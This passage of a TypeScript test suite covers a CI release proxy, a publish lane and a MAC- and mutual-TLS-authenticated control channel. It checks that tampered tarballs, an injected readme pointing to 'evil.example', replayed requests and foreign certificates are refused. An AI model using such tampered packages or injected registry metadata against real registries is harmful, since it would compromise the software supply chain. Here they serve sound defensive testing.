    const body = publishDoc(npmTar);
    const viaProxy = (b: string) =>
      fetch("https://registry.npmjs.org/@acme%2Fweb", {
        method: "PUT",
        body: b,
        headers: { "content-type": "application/json" },
        proxy: r.credential.proxyUrl(r.listen.host, r.listen.port),
        tls: { ca: r.credential.caPem },
      });
    const ok = await viaProxy(body);
    expect(ok.status).toBe(201);
    expect(seen).toHaveLength(1);
    expect(seen[0]!.auth).toBe(`Bearer ${TOKEN_NPM}`);
    expect(seen[0]!.url).toBe("https://registry.npmjs.org/@acme%2Fweb");
    // other bytes under the same name are refused and never sent
    const evil = await tarball({ ...PKG, evil: true });
    const bad = await viaProxy(publishDoc(evil, { ...PKG, evil: true }));
    expect(bad.status).toBe(403);
    // the approved bytes with a document the lane did not derive are refused too
    const tagged = await viaProxy(
      publishDoc(npmTar, PKG, { "dist-tags": { latest: "1.0.0", next: "1.0.0" } }),
    );
    expect(tagged.status).toBe(403);
    // text npmjs.com would show must come from the tarball
    const injected = await viaProxy(publishDoc(npmTar, PKG, { readme: "visit evil.example" }));
    expect(injected.status).toBe(403);
    expect(seen).toHaveLength(1);
    const log = await outcomes();
    expect(log).toContain("secret_use:ok");
    expect(log).toContain("proxy_deny:body_digest_not_approved");
    expect(JSON.stringify(await chainedAudit(db, a.orgId, 0, 500))).not.toContain(TOKEN_NPM);
    expect(checkBody({ type: "sha256", digests: [sha256("x")] }, Buffer.from("x"))).toEqual({
      ok: true,
    });
  });

  test("a freeze refuses the next request and sweepFrozen ends the credential", async () => {
    await sign();
    const r = await reg();
    if (!r.ok) throw new Error("not registered");
    await setFreeze(db, a.scope, { by: "t", reason: "incident", now: 1 });
    const res = await fetch("https://registry.npmjs.org/@acme%2Fweb", {
      proxy: r.credential.proxyUrl(r.listen.host, r.listen.port),
      tls: { ca: r.credential.caPem },
    });
    expect(res.status).toBe(502);
    expect(seen).toHaveLength(0);
    expect(await proxy!.sweepFrozen()).toBe(1);
    expect(proxy!.active).toBe(0);
    expect(await outcomes()).toContain("release_proxy_revoke:frozen");
  });

  describe("the GitHub draft the lane creates before the job runs", () => {
    let release: { id: number; draft: boolean } | undefined;
    let created = 0;
    const gh: SafeFetch = async (input, init) => {
      const u = new URL(String(input));
      const method = init?.method ?? "GET";
      if (u.pathname.startsWith("/repos/acme/web/releases/tags/")) {
        return release ? Response.json(release) : new Response("{}", { status: 404 });
      }
      if (method === "POST" && u.pathname === "/repos/acme/web/releases") {
        created += 1;
        release = { id: 101, draft: true };
        return Response.json(release, { status: 201 });
      }
      return new Response("{}", { status: 404 });
    };
    const ghProxy = async (token: string | null = "ghp_write_token_5521ab") => {
      await proxy?.stop();
      attest.removePublishTarget(a.orgId, a.projectId, "npm");
      attest.setPublishTarget(a.orgId, a.projectId, "rel", { ...GH, assets: ["web-1.0.0.tgz"] }, 0);
      proxy = await ReleaseProxy.start({
        db,
        vault,
        attest,
        bytes: { read: async (_r, n) => blobs.get(n) },
        forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
        githubToken: async () => token ?? undefined,
        github: { api: "https://api.gh.test", fetch: gh },
        upstream,
      });
    };
    beforeEach(() => {
      release = undefined;
      created = 0;
    });

    test("the lane creates the draft and the job may upload to that release id only", async () => {
      await sign();
      await ghProxy();
      const r = await reg();
      if (!r.ok) throw new Error(`not registered: ${r.reason}`);
      expect(created).toBe(1);
      expect(r.rules).toEqual(["rel:read", "rel:upload"]);
      const call = (url: string, method = "POST") =>
        fetch(url, {
          method,
          body: method === "GET" ? undefined : "asset bytes",
          proxy: r.credential.proxyUrl(r.listen.host, r.listen.port),
          tls: { ca: r.credential.caPem },
        });
      const base = "https://uploads.github.com/repos/acme/web/releases";
      expect((await call(`${base}/101/assets?name=cli-linux`)).status).toBe(201);
      expect(seen.at(-1)!.auth).toBe("Bearer ghp_write_token_5521ab");
      // another release (a published one), a create, an edit and a delete are not in the rules
      expect((await call(`${base}/102/assets?name=cli-linux`)).status).toBe(403);
      expect((await call("https://api.github.com/repos/acme/web/releases")).status).toBe(403);
      expect(
        (await call("https://api.github.com/repos/acme/web/releases/101", "PATCH")).status,
      ).toBe(403);
      expect(
        (await call("https://api.github.com/repos/acme/web/releases/101", "DELETE")).status,
      ).toBe(403);
      expect(seen).toHaveLength(1);
    });

    test("a release already published for the tag, or no credential to make a draft, gives no rules", async () => {
      await sign();
      await ghProxy();
      release = { id: 7, draft: false };
      expect(await reg("p1")).toEqual({ ok: false, reason: "draft_unavailable" });
      expect(created).toBe(0);
      await ghProxy(null);
      release = undefined;
      expect(await reg("p2")).toEqual({ ok: false, reason: "draft_unavailable" });
      expect(created).toBe(0);
    });

    test("an existing draft is reused, not duplicated", async () => {
      await sign();
      await ghProxy();
      release = { id: 55, draft: true };
      const r = await reg();
      expect(r.ok && r.rules.includes("rel:upload")).toBe(true);
      expect(created).toBe(0);
    });
  });
});

describe("finishing a compat release", () => {
  let db: Db;
  let a: Tenant;
  let attest: AttestationStore;
  let npmTar: Uint8Array;
  let versions: Map<string, string>;
  let puts: number;
  const reply = (status: number, body: unknown = {}): Response => Response.json(body, { status });
  const fakeFetch: SafeFetch = async (_input, init) => {
    const method = init?.method ?? "GET";
    if (method === "GET") {
      const v = Object.fromEntries([...versions].map(([k, i]) => [k, { dist: { integrity: i } }]));
      return versions.size === 0 ? reply(404) : reply(200, { versions: v });
    }
    puts += 1;
    const doc = JSON.parse(String(init?.body)) as {
      versions: Record<string, { dist: { integrity: string } }>;
    };
    for (const [v, m] of Object.entries(doc.versions)) versions.set(v, m.dist.integrity);
    return reply(201);
  };
  const lane = (): ReleaseLane =>
    new ReleaseLane({
      db,
      forge: { tagCommit: async () => ({ found: true, sha: SHA }) },
      bytes: { read: async (_r, n) => (n === "web-1.0.0.tgz" ? npmTar : undefined) },
      records: {
        async recorded(_s, _r, names) {
          return names.map((n) => ({ name: n, sha256: sha256(npmTar) }));
        },
      },
      attest,
      signer: {
        async signRelease(_s, req) {
          return {
            ok: true,
            envelope: {},
            keyid: "k",
            subjects: req.verified.subjects.map((x) => ({ ...x })),
          };
        },
      },
      publish: {
        credentials: { secret: async () => TOKEN_NPM, githubToken: async () => undefined },
        fetch: fakeFetch,
        npmRegistry: "https://registry.test",
      },
      owner: "lane-1",
      now: () => 1_800_000_000_000,
    });

  beforeEach(async () => {
    ({ db, a } = await seedWorld());
    npmTar = await tarball(PKG);
    versions = new Map();
    puts = 0;
    attest = new AttestationStore(":memory:");
    attest.pinRepo(a.orgId, a.projectId, "acme/web", 0);
    attest.setPublishTarget(a.orgId, a.projectId, "npm", NPM, 0);
    await db.orm
      .update(s.runs)
      .set({ repo: "acme/web", ref: "refs/tags/v1.0.0", sha: SHA, status: "success" })
      .where(eq(s.runs.id, a.runId));
    await createReleaseRequest(db, a.scope, {
      runId: a.runId,
      tag: "v1.0.0",
      artifacts: ["web-1.0.0.tgz"],
      requestedBy: "t",
    });
  });
  afterEach(() => attest.close());

  test("signing a compat target publishes nothing; it waits for the job", async () => {
    await lane().processNext();
    expect(puts).toBe(0);
    expect(attest.publishState({ ...a.scope, repo: "acme/web", tag: "v1.0.0" }, "npm")?.state).toBe(
      "pending",
    );
  });

  test("when the job published the approved bytes the target is already done; otherwise the lane publishes", async () => {
    const l = lane();
    await l.processNext();
    versions.set("1.0.0", integrityOf(npmTar));
    expect(await l.finalize({ ...a.scope, runId: a.runId })).toMatchObject([
      { target: "npm", state: "already" },
    ]);
    expect(puts).toBe(0);
    // every target done: the release is closed to the proxy
    expect(attest.approvedRelease({ ...a.scope, runId: a.runId })?.finalizedAt).toBeDefined();

    attest.setPublishState(
      { ...a.scope, repo: "acme/web", tag: "v1.0.0" },
      "npm",
      "pending",
      null,
      0,
    );
    versions.clear();
    expect(await l.finalize({ ...a.scope, runId: a.runId })).toMatchObject([
      { target: "npm", state: "published" },
    ]);
    expect(puts).toBe(1);
  });

  test("a target that failed leaves the release open so finalize can resume it", async () => {
    const l = lane();
    await l.processNext();
    versions.set("1.0.0", "sha512-other");
    const r = await l.finalize({ ...a.scope, runId: a.runId });
    expect(r.some((x) => x.state === "refused" || x.state === "failed")).toBe(true);
    expect(attest.approvedRelease({ ...a.scope, runId: a.runId })?.finalizedAt).toBeUndefined();
  });

  test("a version with other bytes under the name is refused, never accepted", async () => {
    const l = lane();
    await l.processNext();
    versions.set("1.0.0", "sha512-not-ours");
    expect(await l.finalize({ ...a.scope, runId: a.runId })).toMatchObject([
      { state: "refused", reason: "republish_mismatch" },
    ]);
  });

  test("nothing without the lane's own approval, and nothing while the tag has moved", async () => {
    expect(await lane().finalize({ ...a.scope, runId: a.runId })).toMatchObject([
      { reason: "not_approved" },
    ]);
  });
});

describe("the release channel", () => {
  const key = Buffer.from("k".repeat(32));
  let db: Db;
  let a: Tenant;
  let attest: AttestationStore;
  let proxy: ReleaseProxy;
  let channel: RunningChannel;
  let socket: string;
  let tagSha = SHA;
  let clock = 1_800_000_000_000;
  let npmTar: Uint8Array;
  const ids = () => ({
    orgId: a.orgId,
    projectId: a.projectId,
    runId: a.runId,
    jobId: a.jobId,
    attemptId: a.attemptId,
  });
  const post = (path: string, body: unknown) => controlPost({ unix: socket }, path, body);
  const signedRegister = (over: Record<string, unknown> = {}, ts = clock) => {
    const b = { ...ids(), ...over };
    return post("/v1/register", {
      ...b,
      ts,
      mac: channelMac(key, "register", registerFields(b as ReturnType<typeof ids>), ts),
    });
  };
  const asAttempt = (state: string, klass: string | null) =>
    db.orm
      .update(s.jobAttempts)
      .set({ state, trustClass: klass })
      .where(eq(s.jobAttempts.id, a.attemptId));

  beforeEach(async () => {
    ({ db, a } = await seedWorld());
    resetFailureThrottle();
    tagSha = SHA;
    clock = Date.now();
    npmTar = await tarball(PKG);
    attest = new AttestationStore(":memory:");
    attest.pinRepo(a.orgId, a.projectId, "acme/web", 0);
    attest.setPublishTarget(a.orgId, a.projectId, "npm", NPM, 0);
    const masterKey = randomBytes(32);
    await new SecretVault({ db, masterKey }).set(a.orgId, "t", { name: "NPM_TOKEN" }, TOKEN_NPM, {
      destinations: ["registry.npmjs.org"],
      trustClasses: ["release"],
    });
    await db.orm
      .update(s.runs)
      .set({ repo: "acme/web", ref: "refs/tags/v1.0.0", sha: SHA, status: "success" })
      .where(eq(s.runs.id, a.runId));
    await createReleaseRequest(db, a.scope, {
      runId: a.runId,
      tag: "v1.0.0",
      artifacts: ["web-1.0.0.tgz"],
      requestedBy: "t",
    });
    await new ReleaseLane({
      db,
      forge: { tagCommit: async () => ({ found: true, sha: SHA }) },
      bytes: { read: async () => npmTar },
      records: {
        async recorded(_s, _r, names) {
          return names.map((n) => ({ name: n, sha256: sha256(npmTar) }));
        },
      },
      attest,
      signer: {
        async signRelease(_s, req) {
          return {
            ok: true,
            envelope: {},
            keyid: "k",
            subjects: req.verified.subjects.map((x) => ({ ...x })),
          };
        },
      },
      owner: "lane-1",
    }).processNext();
    proxy = await ReleaseProxy.start({
      db,
      vault: new SecretVault({ db, masterKey, lane: "release" }),
      attest,
      bytes: { read: async () => npmTar },
      forge: { tagCommit: async () => ({ found: true, sha: tagSha }) },
      githubToken: async () => undefined,
    });
    socket = join(mkdtempSync(join(tmp, "chan-")), "run", "channel.sock");
    channel = await startChannel({ db, proxy, key, listen: { unix: socket }, now: () => clock });
    await asAttempt("running", "release");
  });
  afterEach(async () => {
    channel.stop();
    await proxy.stop();
    attest.close();
  });

  test("a running release attempt of a signed run gets an endpoint and a proxy credential, nothing else", async () => {
    const r = await signedRegister();
    expect(r.status).toBe(200);
    const b = r.json as Record<string, unknown>;
    expect(Object.keys(b).sort()).toEqual([
      "caPem",
      "endpoint",
      "expiresAt",
      "ok",
      "password",
      "username",
    ]);
    expect(b.username).toBe(a.attemptId);
    expect(JSON.stringify(b)).not.toContain(TOKEN_NPM);
    expect(proxy.active).toBe(1);
  });

  test("the socket is private to its owner", () => {
    expect(statSync(socket).mode & 0o777).toBe(0o600);
    expect(statSync(dirname(socket)).mode & 0o777).toBe(0o700);
  });

  test("a bad MAC, a stale time and a replay are refused before anything is looked up", async () => {
    const bad = await post("/v1/register", { ...ids(), ts: clock, mac: "0".repeat(64) });
    expect(bad).toMatchObject({ status: 401, json: { reason: "bad_mac" } });
    const stale = await signedRegister({}, clock - 5 * 60_000);
    expect(stale).toMatchObject({ status: 401, json: { reason: "bad_mac" } });
    const other = await post("/v1/register", {
      ...ids(),
      ts: clock,
      mac: channelMac("another key entirely", "register", registerFields(ids()), clock),
    });
    expect(other.status).toBe(401);
    expect((await signedRegister()).status).toBe(200);
    expect(await signedRegister()).toMatchObject({ status: 401, json: { reason: "replay" } });
    expect(proxy.active).toBe(1);
  });

  test("a field changed after signing fails the MAC", async () => {
    const b = ids();
    const ts = clock;
    const mac = channelMac(key, "register", registerFields(b), ts);
    const r = await post("/v1/register", { ...b, runId: "another-run", ts, mac });
    expect(r.status).toBe(401);
  });

  test("the lane checks the attempt itself: running, release class, in this job and run", async () => {
    await asAttempt("queued", "release");
    expect(await signedRegister()).toMatchObject({
      status: 403,
      json: { reason: "attempt_not_release_running" },
    });
    await asAttempt("running", "protected");
    expect(await signedRegister({}, clock + 1)).toMatchObject({
      status: 403,
      json: { reason: "attempt_not_release_running" },
    });
    await asAttempt("running", null);
    expect((await signedRegister({}, clock + 2)).status).toBe(403);
    await asAttempt("running", "release");
    expect(
      (await signedRegister({ jobId: "someone-elses-job" }, clock + 3)) as { status: number },
    ).toMatchObject({ status: 403 });
    expect(proxy.active).toBe(0);
  });

  test("the lane's own file decides: a moved tag or no approval gives nothing", async () => {
    tagSha = "d".repeat(40);
    expect(await signedRegister()).toMatchObject({ status: 403, json: { reason: "tag_moved" } });
    tagSha = SHA;
    attest.removePublishTarget(a.orgId, a.projectId, "npm");
    expect(await signedRegister({}, clock + 1)).toMatchObject({
      status: 403,
      json: { reason: "no_compat_targets" },
    });
  });

  test("a second registration for the same attempt is refused", async () => {
    expect((await signedRegister()).status).toBe(200);
    expect(await signedRegister({}, clock + 1)).toMatchObject({
      status: 403,
      json: { reason: "already_registered" },
    });
  });

  test("revoke ends the credential; an unsigned revoke does not", async () => {
    await signedRegister();
    expect(proxy.active).toBe(1);
    const ts = clock;
    expect(
      (await post("/v1/revoke", { attemptId: a.attemptId, ts, mac: "f".repeat(64) })).status,
    ).toBe(401);
    expect(proxy.active).toBe(1);
    const ok = await post("/v1/revoke", {
      attemptId: a.attemptId,
      ts,
      mac: channelMac(key, "revoke", [a.attemptId], ts),
    });
    expect(ok.status).toBe(200);
    expect(proxy.active).toBe(0);
  });

  describe("health", () => {
    const health = (over: Record<string, unknown> = {}, ts = clock) =>
      post("/v1/health", { ts, mac: channelMac(key, "health", [], ts), ...over });

    test("a valid MAC answers 200 and changes nothing", async () => {
      await signedRegister();
      expect(proxy.active).toBe(1);
      expect(await health()).toMatchObject({ status: 200, json: { ok: true } });
      // asking twice is fine: health is not a replay-guarded call and holds no state
      expect((await health()).status).toBe(200);
      expect(proxy.active).toBe(1);
      const row = await db.orm
        .select({ state: s.jobAttempts.state })
        .from(s.jobAttempts)
        .where(eq(s.jobAttempts.id, a.attemptId));
      expect(row[0]?.state).toBe("running");
    });

    test("a bad or missing MAC is 401", async () => {
      expect(await health({ mac: "0".repeat(64) })).toMatchObject({
        status: 401,
        json: { reason: "bad_mac" },
      });
      expect((await health({ mac: undefined })).status).toBe(401);
      expect((await health({ mac: "not hex" })).status).toBe(401);
      expect((await post("/v1/health", { ts: clock })).status).toBe(401);
      expect(
        (await health({ mac: channelMac("another key entirely", "health", [], clock) })).status,
      ).toBe(401);
    });

    test("a stale or missing ts is refused", async () => {
      const old = clock - 5 * 60_000;
      expect((await health({}, old)).status).toBe(401);
      const future = clock + 5 * 60_000;
      expect((await health({}, future)).status).toBe(401);
      // a MAC over a fresh ts does not carry a stale ts in the body
      expect((await health({ ts: old })).status).toBe(401);
      expect((await post("/v1/health", { mac: channelMac(key, "health", [], clock) })).status).toBe(
        401,
      );
    });

    test("a MAC computed for health is refused by register and revoke: the operation is bound in", async () => {
      const mac = channelMac(key, "health", [], clock);
      const reg = await post("/v1/register", { ...ids(), ts: clock, mac });
      expect(reg).toMatchObject({ status: 401, json: { reason: "bad_mac" } });
      expect(proxy.active).toBe(0);
      await signedRegister({}, clock + 1);
      expect(proxy.active).toBe(1);
      const rev = await post("/v1/revoke", { attemptId: a.attemptId, ts: clock, mac });
      expect(rev).toMatchObject({ status: 401, json: { reason: "bad_mac" } });
      expect(proxy.active).toBe(1);
    });
  });

  test("malformed bodies and unknown paths", async () => {
    expect((await post("/v1/register", { orgId: "x" })).status).toBe(400);
    expect((await post("/v1/other", {})).status).toBe(404);
    expect(
      (await post("/v1/register", { ...ids(), attemptId: "bad id!", ts: clock, mac: "a" })).status,
    ).toBe(400);
  });

  describe("over TCP with mutual TLS", () => {
    interface Pki {
      ca: string;
      key: string;
      cert: string;
    }
    /** Runs openssl; certificates are made at run time and never stored. */
    const openssl = async (args: string[]): Promise<void> => {
      const p = Bun.spawn(["openssl", ...args], { stdout: "ignore", stderr: "ignore" });
      if ((await p.exited) !== 0) throw new Error(`openssl ${args[0]} failed`);
    };
    async function authority(name: string): Promise<{ dir: string; pem: string }> {
      const dir = mkdtempSync(join(tmp, "ca-"));
      await openssl([
        "req",
        "-x509",
        "-newkey",
        "ec",
        "-pkeyopt",
        "ec_paramgen_curve:prime256v1",
        "-nodes",
        "-days",
        "2",
        "-subj",
        `/CN=${name}`,
        "-addext",
        "basicConstraints=critical,CA:TRUE",
        "-addext",
        "keyUsage=critical,keyCertSign,cRLSign",
        "-keyout",
        join(dir, "ca.key"),
        "-out",
        join(dir, "ca.pem"),
      ]);
      return { dir, pem: readFileSync(join(dir, "ca.pem"), "utf8") };
    }
    async function leaf(ca: { dir: string; pem: string }, cn: string, usage: string): Promise<Pki> {
      const dir = mkdtempSync(join(tmp, "leaf-"));
      writeFileSync(
        join(dir, "ext"),
        `subjectAltName=DNS:localhost,IP:127.0.0.1\nextendedKeyUsage=${usage}\nkeyUsage=digitalSignature\n`,
      );
      await openssl([
        "req",
        "-new",
        "-newkey",
        "ec",
        "-pkeyopt",
        "ec_paramgen_curve:prime256v1",
        "-nodes",
        "-subj",
        `/CN=${cn}`,
        "-keyout",
        join(dir, "k.pem"),
        "-out",
        join(dir, "c.csr"),
      ]);
      await openssl([
        "x509",
        "-req",
        "-in",
        join(dir, "c.csr"),
        "-CA",
        join(ca.dir, "ca.pem"),
        "-CAkey",
        join(ca.dir, "ca.key"),
        "-CAcreateserial",
        "-days",
        "2",
        "-extfile",
        join(dir, "ext"),
        "-out",
        join(dir, "c.pem"),
      ]);
      return {
        ca: ca.pem,
        key: readFileSync(join(dir, "k.pem"), "utf8"),
        cert: readFileSync(join(dir, "c.pem"), "utf8"),
      };
    }

    let tcp: RunningChannel;
    let url: string;
    let server: Pki;
    let client: Pki;
    let strangerClient: Pki;
    let strangerServer: Pki;
    const body = () => {
      const b = ids();
      return {
        ...b,
        ts: clock,
        mac: channelMac(key, "register", registerFields(b), clock),
      };
    };

    beforeEach(async () => {
      const good = await authority("turntable test CA");
      const other = await authority("someone else's CA");
      server = await leaf(good, "release lane", "serverAuth");
      client = await leaf(good, "worker", "clientAuth");
      strangerClient = await leaf(other, "worker", "clientAuth");
      strangerServer = await leaf(other, "release lane", "serverAuth");
      const probe = Bun.serve({ port: 0, fetch: () => new Response("") });
      const port = probe.port as number;
      await probe.stop(true);
      tcp = await startChannel({
        db,
        proxy,
        key,
        now: () => clock,
        listen: {
          tcp: {
            host: "127.0.0.1",
            port,
            tls: { cert: server.cert, key: server.key, ca: good.pem },
          },
        },
      });
      url = `https://127.0.0.1:${port}`;
    });
    afterEach(() => tcp.stop());

    test("a client with a certificate from the operator's CA is served", async () => {
      const r = await controlPost(
        { url, tls: { cert: client.cert, key: client.key, ca: server.ca } },
        "/v1/register",
        body(),
      );
      expect(r.status).toBe(200);
      expect((r.json as { ok: boolean }).ok).toBe(true);
      expect(proxy.active).toBe(1);
    });

    test("a client certificate from another CA is not served", async () => {
      await expect(
        controlPost(
          { url, tls: { cert: strangerClient.cert, key: strangerClient.key, ca: server.ca } },
          "/v1/register",
          body(),
        ),
      ).rejects.toThrow();
      expect(proxy.active).toBe(0);
    });

    test("a client with no certificate is not served", async () => {
      await expect(
        fetch(`${url}/v1/register`, {
          method: "POST",
          body: JSON.stringify(body()),
          tls: { ca: server.ca },
        }),
      ).rejects.toThrow();
      expect(proxy.active).toBe(0);
    });

    test("a client that does not trust the server's CA does not talk to it", async () => {
      await expect(
        controlPost(
          { url, tls: { cert: client.cert, key: client.key, ca: strangerServer.ca } },
          "/v1/register",
          body(),
        ),
      ).rejects.toThrow();
      expect(proxy.active).toBe(0);
    });

    test("a valid certificate still needs the request key", async () => {
      const r = await controlPost(
        { url, tls: { cert: client.cert, key: client.key, ca: server.ca } },
        "/v1/register",
        { ...body(), mac: "0".repeat(64) },
      );
      expect(r.status).toBe(401);
    });
  });

  describe("the worker's wrapper", () => {
    const client = () => createChannelClient({ target: { unix: socket }, key, now: () => clock });
    const ctx = (klass: string): AttemptContext =>
      ({
        run: { id: a.runId, trust: JSON.stringify({ class: klass, workflowHash: "h" }) },
        scope: a.scope,
        job: { id: a.jobId },
        attempt: { id: a.attemptId },
        signal: new AbortController().signal,
      }) as unknown as AttemptContext;
    const outcome = { state: "success" } as unknown as AttemptOutcome;

    test("a release job runs behind the release proxy, and the credential is revoked after", async () => {
      let seenProxy: AttemptContext["proxy"];
      const run = withReleaseChannel(
        async (c) => {
          seenProxy = c.proxy;
          expect(proxy.active).toBe(1);
          return outcome;
        },
        { client: client() },
      );
      expect(await run(ctx("release"))).toBe(outcome);
      expect(seenProxy?.vaultRules).toBe(true);
      expect(seenProxy?.credential.username).toBe(a.attemptId);
      expect(seenProxy?.listen.port).toBe(proxy.port);
      expect(proxy.active).toBe(0);
    });

    test("other classes never ask; a refusal or a dead channel leaves the job as it was", async () => {
      let asked = 0;
      const spy = createChannelClient({ target: { unix: socket }, key, now: () => clock });
      const counting = {
        ...spy,
        register: async (x: Parameters<typeof spy.register>[0]) => {
          asked += 1;
          return spy.register(x);
        },
      };
      const seenProxy: unknown[] = [];
      const run = withReleaseChannel(
        async (c) => {
          seenProxy.push(c.proxy);
          return outcome;
        },
        { client: counting },
      );
      await run(ctx("protected"));
      expect(asked).toBe(0);
      tagSha = "e".repeat(40);
      await run(ctx("release"));
      expect(asked).toBe(1);
      channel.stop();
      await run(ctx("release"));
      expect(seenProxy).toEqual([undefined, undefined, undefined]);
    });
  });
});

describe("release proxy and channel configuration", () => {
  const base = {
    TURNTABLE_RELEASE_MASTER_KEY_FILE: "/k",
    TURNTABLE_RELEASE_DATA_DIR: "/d",
    TURNTABLE_RELEASE_GITHUB_TOKEN: "t",
    TURNTABLE_RELEASE_ARTIFACT_DIR: "/a",
    TURNTABLE_RELEASE_BUILDER_ID: "https://ci.example.com",
  };
  test("off by default; the channel needs the proxy", () => {
    expect(releaseConfigFromEnv(base)).not.toHaveProperty("proxy");
    expect(releaseConfigFromEnv(base)).not.toHaveProperty("channel");
    expect(() =>
      releaseConfigFromEnv({ ...base, TURNTABLE_RELEASE_CHANNEL_KEY_FILE: "/ck" }),
    ).toThrow("release proxy");
    expect(() =>
      releaseConfigFromEnv({ ...base, TURNTABLE_RELEASE_PROXY_PORT: "70000" }),
    ).toThrow();
  });
  test("a unix socket by default, TCP only with all three TLS files", () => {
    const withProxy = {
      ...base,
      TURNTABLE_RELEASE_PROXY_PORT: "0",
      TURNTABLE_RELEASE_CHANNEL_KEY_FILE: "/ck",
    };
    expect(releaseConfigFromEnv(withProxy)).toMatchObject({
      proxy: { bind: "127.0.0.1", port: 0 },
      channel: { keyFile: "/ck", tcp: undefined },
    });
    const tcp = { ...withProxy, TURNTABLE_RELEASE_CHANNEL_TCP: "10.0.0.2:7443" };
    expect(() => releaseConfigFromEnv(tcp)).toThrow("TURNTABLE_RELEASE_CHANNEL_TLS_CERT_FILE");
    expect(
      releaseConfigFromEnv({
        ...tcp,
        TURNTABLE_RELEASE_CHANNEL_TLS_CERT_FILE: "/c",
        TURNTABLE_RELEASE_CHANNEL_TLS_KEY_FILE: "/k",
        TURNTABLE_RELEASE_CHANNEL_TLS_CA_FILE: "/ca",
      }).channel?.tcp,
    ).toMatchObject({ host: "10.0.0.2", port: 7443 });
    expect(() => releaseConfigFromEnv({ ...tcp, TURNTABLE_RELEASE_CHANNEL_TCP: "nope" })).toThrow();
  });
});
